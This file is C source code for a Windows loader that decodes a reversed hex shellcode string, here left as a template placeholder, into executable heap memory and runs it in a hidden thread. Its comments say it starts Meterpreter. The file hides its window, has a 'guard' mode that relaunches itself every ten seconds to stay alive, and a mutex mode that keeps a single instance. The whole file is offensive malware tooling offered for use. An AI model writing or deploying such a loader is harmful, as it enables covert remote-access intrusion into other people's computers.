#pragma comment(linker,"/subsystem:\"windows\"  /entry:\"mainCRTStartup\"" )
#define _CRT_SECURE_NO_DEPRECATE
#include <string.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

//gcc main.c -mwindows -s -o loader_x64.exe

void StringToHex(char* str, unsigned char* out) {
	char* p = str;
	char high = 0, low = 0;
	int tmplen = strlen(p);
	int cnt = 0;
	tmplen = strlen(p);
	while (cnt < (tmplen / 2)) {
		high = ((*p > '9') && ((*p <= 'F') || (*p <= 'f'))) ? *p - 48 - 7 : *p - 48;
		low = (*(++p) > '9' && ((*p <= 'F') || (*p <= 'f'))) ? *(p)-48 - 7 : *(p)-48;
		out[cnt] = ((high & 0x0f) << 4 | (low & 0x0f));
		p++;
		cnt++;
	}
	if (tmplen % 2 != 0) out[cnt] = ((*p > '9') && ((*p <= 'F') || (*p <= 'f'))) ? *p - 48 - 7 : *p - 48;
	return;
}


void fakerun(void* buffer) {
	void(*function)();
	function = (void(*)())buffer;
	function();
}

void hardCodeMeter() {
	char buffer[] = "{{SHELLCODE_STR}}";
	_strrev(buffer);
	unsigned char hexbuffer[409600] = { 0 };

	StringToHex(buffer, hexbuffer);

	LPVOID heapp = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
	void* ptr = HeapAlloc(heapp, 0, sizeof(hexbuffer));
	RtlMoveMemory(ptr, hexbuffer, sizeof(hexbuffer));
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(fakerun), ptr, 0, NULL);
	WaitForSingleObject(hThread, -1); //INFINITE
	CloseHandle(hThread);
}



//
// Call self without parameter to start 
//

BOOL SelfCall() {
	char path[MAX_PATH];
	char cmd[MAX_PATH];

	if (GetModuleFileName(NULL, path, sizeof(path)) == 0) {
		// Get module file name failed
		return FALSE;
	}
	STARTUPINFO startup_info;
	PROCESS_INFORMATION process_information;

	ZeroMemory(&startup_info, sizeof(startup_info));
	startup_info.cb = sizeof(startup_info);

	ZeroMemory(&process_information, sizeof(process_information));

	// If create process failed.
	// CREATE_NO_WINDOW = 0x08000000
	if (CreateProcess(path, path, NULL, NULL, TRUE, 0x08000000, NULL,
		NULL, &startup_info, &process_information) == 0) {
		return FALSE;
	}

	// Wait until the process died.
	WaitForSingleObject(process_information.hProcess, -1);
	return TRUE;
}


//
// Call self with parameter guard to start meterpreter
//

void GuardCall() {
	char path[MAX_PATH];
	char cmd[MAX_PATH];
	cmd[0] = '\0';
	strcat(cmd, path);
	strcat(cmd, " guard");
	if (GetModuleFileName(NULL, path, sizeof(path)) == 0) {
		// Get module file name failed
		return;
	}

	STARTUPINFO startup_info;
	PROCESS_INFORMATION process_information;

	ZeroMemory(&startup_info, sizeof(startup_info));
	startup_info.cb = sizeof(startup_info);

	ZeroMemory(&process_information, sizeof(process_information));

	// If create process failed.
	// CREATE_NO_WINDOW = 0x08000000
	if (CreateProcess(path, cmd, NULL, NULL, TRUE, 0x08000000, NULL,
		NULL, &startup_info, &process_information) == 0) {
		return;
	}

	// Wait until the process died.
	WaitForSingleObject(process_information.hProcess, -1);
}


void MutexCall() {
	char path[MAX_PATH];
	GetModuleFileName(NULL, path, MAX_PATH);
	char drive[5];
	char dir[MAX_PATH];
	char filename[MAX_PATH];
	char fileext[10];
	_splitpath(path, drive, dir, filename, fileext);
	HANDLE hMutex = CreateMutexA(NULL, FALSE, filename);
	if (GetLastError() == ERROR_ALREADY_EXISTS) {
		return;
	}
	hardCodeMeter();
}


//
// Main function
//

int main() {

	LPTSTR cmdline;
	cmdline = GetCommandLine();

	char* argv[MAX_PATH];
	char* ch = strtok(cmdline, " ");
	int argc = 0;
	BOOL returnflag = FALSE;
	while (ch != NULL) {
		argv[argc] = malloc(strlen(ch) + 1);
		strncpy(argv[argc], ch, strlen(ch) + 1);
		ch = strtok(NULL, " ");
		argc++;
	}

	if (argc > 1) {
		if (strcmp(argv[argc - 1], "guard") == 0) {
			// Starts the loop
			while (TRUE) {
				returnflag = SelfCall();
				if (returnflag == FALSE) {
					printf("Create process failed");
					return 0;
				}
				Sleep(10000);
			}
			return 0;
		}
		else if (strcmp(argv[argc - 1], "mutex") == 0) {
			// Starts the Meterpreter
			MutexCall();
			return 0;
		}
	}
	// Starts the Meterpreter as a normal application
	hardCodeMeter();
	return 0;
}
